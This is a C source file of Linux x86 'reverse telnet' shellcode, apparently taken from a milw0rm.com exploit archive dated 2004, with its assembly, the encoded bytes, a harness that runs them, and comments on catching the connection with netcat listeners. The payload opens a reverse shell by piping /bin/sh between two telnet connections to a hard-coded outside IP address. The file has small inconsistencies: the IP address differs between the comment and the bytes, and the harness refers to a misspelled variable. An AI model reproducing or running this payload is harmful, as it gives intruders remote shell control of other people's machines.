/*
   Reverse Telnet Shellcode by hts
*/
/*
        jmp   0x31
        popl  %esi
        movl  %esi,0x4f(%esi)
        leal  0x8(%esi),%ebx
        movl  %ebx,0x53(%esi)
        leal  0xb(%esi),%ebx
        movl  %ebx,0x57(%esi)
        xorl  %eax,%eax
        movb  %eax,0x7(%esi)
        movb  %eax,0xa(%esi)
        movb  %eax,0x4e(%esi)
        movl  %eax,0x5b(%esi)
        movb  $0xb,%al
        movl  %esi,%ebx
        leal  0x4f(%esi),%ecx
        leal  0x5b(%esi),%edx
        int   $0x80
        xorl  %ebx,%ebx
        movl  %ebx,%eax
        inc   %eax
        int   $0x80
        call  -0x36
        .string \"/bin/sh -c /bin/telnet 200.182.207.235 5|/bin/sh|/bin/telnet 200.182.207.235 6\"
*/

char shellcode[] =
        "\xeb\x31\x5e\x89\x76\x4f\x8d\x5e\x08\x89\x5e\x53"
        "\x8d\x5e\x0b\x89\x5e\x57\x31\xc0\x88\x46\x07\x88"
        "\x46\x0a\x88\x46\x4e\x89\x46\x5b\xb0\x0b\x89\xf3"
        "\x8d\x4e\x4f\x8d\x56\x5b\xcd\x80\x31\xdb\x89\xd8"
        "\x40\xcd\x80\xe8\xca\xff\xff\xff/bin/sh -c /bin/"
        "telnet 200.182.207.246 5|/bin/sh|/bin/telnet 200"
        ".182.207.246 6";

#define NAME "Reverse Telnet Shellcode - by hts"

void main(){
  void (*s)() = (void *)hellcode;
  printf("Shellcode length: %d\nExecuting..\n\n", strlen(hellcode));
  s();
}

/* I don't know if exists any reverse telnet shellcode..
 * you should modify your ip addr to use it...
 * to use it, nc -l -p 5 , on another terminal nc -l -p 6
 * then run the shellcode with your ip addr or just 127.000.000.001
*/

// milw0rm.com [2004-09-26]